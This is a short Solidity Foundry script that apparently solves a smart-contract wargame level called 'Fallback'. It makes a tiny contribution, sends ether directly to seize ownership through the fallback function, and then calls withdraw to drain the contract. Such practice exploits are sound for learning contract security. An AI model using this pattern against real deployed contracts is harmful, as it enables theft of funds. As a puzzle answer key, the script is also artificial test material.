// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.0;

import { Script, console } from "forge-std/Script.sol";
import { Fallback } from "@puzzles/1/Fallback.sol";

contract FallbackSolution is Script {
    function run(address payable target) public {
        Fallback puzzleContract = Fallback(target);

        vm.startBroadcast();
        puzzleContract.contribute{value: 1}();
        (bool success, ) = target.call{value: 1}("");
        require(success, "FallbackSolution: call failed");
        puzzleContract.withdraw();
        vm.stopBroadcast();
    }
}
